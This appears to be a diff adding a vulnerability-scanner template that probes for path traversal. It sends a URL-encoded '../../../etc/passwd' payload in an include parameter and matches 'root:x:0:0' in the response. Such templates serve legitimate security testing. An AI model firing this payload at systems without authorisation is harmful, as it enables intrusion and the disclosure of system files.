@@ -1,0 +1,20 @@
+id: lfi-092
+name: 'Path traversal via include'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads /etc/passwd via include'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      include:
+        - '..%2f..%2f..%2fetc%2fpasswd'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
